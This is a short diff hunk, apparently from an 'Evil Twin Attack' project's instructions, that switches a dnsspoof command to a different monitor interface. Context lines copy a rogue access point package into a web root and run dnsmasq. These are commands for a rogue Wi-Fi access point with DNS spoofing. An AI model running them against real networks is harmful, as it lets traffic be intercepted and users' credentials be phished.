@@ -129,7 +129,7 @@ cp /root/Evil-Twin-Attack-Adam/rogueap.zip /var/www/html
 
  dnsmasq -C dnsmasq.conf -d
 
- dnsspoof -i wlan0mon
+ dnsspoof -i wlan1mon
 
 
 
